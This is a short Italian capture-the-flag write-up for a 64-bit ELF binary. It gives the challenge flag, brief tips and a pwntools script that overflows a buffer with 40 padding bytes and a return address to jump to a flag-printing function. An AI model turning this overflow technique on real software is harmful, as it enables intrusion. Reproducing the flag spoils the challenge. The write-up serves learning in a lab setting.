# Flag
flag: ccit{hi_i_am_a_flag}

# Write-up
L'esercizio è similissimo a quello precedente
Nota bene:
- ELF64bit, di conseguenza usare p64(valore)
- elf.symbols stampa i symbols con indice <b>INTERO</b>, non <b>ESADECIMALE</b>
- Guardare il ``trace.txt`` per i calcoli eseguiti (si può usare sia dei calcolatori online che GDB stesso)
- Just to know: process("pathToFile").interactive() crea una sessione interattiva (in questo esercizio non serviva, stampa diretto la funzione)
```python
from pwn import *

elf = ELF("./hi")

print("This binary has many symbols:")
print(elf.symbols)

with process("./hi") as r:
    inp=b'A'*40+p64(0x400637) #Notare il p64
    r.sendline(inp)
```